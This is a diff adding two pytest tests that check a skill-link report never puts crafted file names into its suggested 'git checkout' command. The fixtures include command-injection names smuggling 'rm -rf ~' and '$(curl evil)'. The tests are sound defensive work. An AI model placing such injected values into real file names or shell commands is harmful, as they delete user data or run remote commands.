@@ -64,3 +64,17 @@ def test_a_file_whose_bytes_are_not_the_link_target_is_not_a_broken_link(tmp_pat
     (p / ".agents" / "skills" / "demo").write_text("my own notes, not a link target")
     fake_runner.responses[("git",)] = runner.Result(0, f"120000 {blob('../../.claude/skills/demo')} 0\t.agents/skills/demo\0", "")
     assert skill_links.plain_files(p) == set()
+
+
+def test_a_crafted_link_name_never_reaches_the_printed_command():
+    evil = {'.agents/skills/x"; rm -rf ~; "', ".agents/skills/$(curl evil)", ".agents/skills/ok-name"}
+    fix = skill_links.report(evil)[-1]
+    command = fix.split("`git checkout -- ", 1)[1].split("`", 1)[0]
+    assert command == '".agents/skills/ok-name"'
+    assert "rm -rf" not in command and "$(" not in command
+    assert "by hand" in fix
+
+
+def test_only_crafted_names_print_no_command():
+    fix = skill_links.report({".agents/skills/$(x)"})[-1]
+    assert "git checkout --" not in fix and "by hand" in fix
